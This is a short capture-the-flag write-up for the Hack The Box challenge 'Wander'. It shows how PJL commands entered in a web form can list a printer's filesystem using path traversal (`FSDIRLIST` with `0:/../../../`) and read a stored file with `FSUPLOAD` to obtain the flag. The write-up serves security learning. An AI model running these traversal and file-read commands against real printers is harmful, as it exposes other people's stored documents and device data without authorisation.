## WriteUp for the challenge [Wander](https://app.hackthebox.com/challenges/wander)

We have the link to the webserver. Opening the web page we see that the only thing we can do is to insert input in the textbox.
It is suggested to submit `@PJL INFO ID`. 

[PJL](https://en.wikipedia.org/wiki/Printer_Job_Language) is a language that permits the communication between the computer and the printer. We can submit the default command to see if this works.

The result is the ID of the printer. This means that we can retrieve informations that we want from the device. Probably we need to find the flag in the printer, so we have to navigate inside its filesystem. Let's search a command for that in the [Wiki](https://usermanual.wiki/HP/bpl13208.787159622/html)

We find that a command is useful for listing files [FSDIRLIST](https://usermanual.wiki/HP/bpl13208.787159622/html#pfad) with examples. Let's enter 
`@PJL FSDIRLIST NAME = "0:/"`. 

We got
```@PJL FSDIRLIST NAME=0:/ ENTRY=1
. TYPE=DIR
.. TYPE=DIR
PJL TYPE=DIR
PostScript TYPE=DIR
saveDevice TYPE=DIR
webServer TYPE=DIR
```

This means we are not yet in the root of the printer. Let's try with:

`@PJL FSDIRLIST NAME = "0:/../../../"`. 

Now we can see the entire filesystem.

```
@PJL FSDIRLIST NAME=0:/../../../ ENTRY=1
. TYPE=DIR
.. TYPE=DIR
etc TYPE=DIR
conf TYPE=DIR
home TYPE=DIR
rw TYPE=DIR
tmp TYPE=DIR
csr_misc TYPE=DIR
printer TYPE=DIR 
```

We have to find interesting file. We notice that inside the **/home/defaults** there is an interesting file. For reading this we have to find another command. Thanks to the manual we notice that [FSUPLOAD](https://usermanual.wiki/HP/bpl13208.787159622/html#pfb5) is what we need. It will display the content of this file on the system.

Let's do this:

`@PJL FSUPLOAD NAME="0:/../../home/default/readyjob"`

And we got the flag.
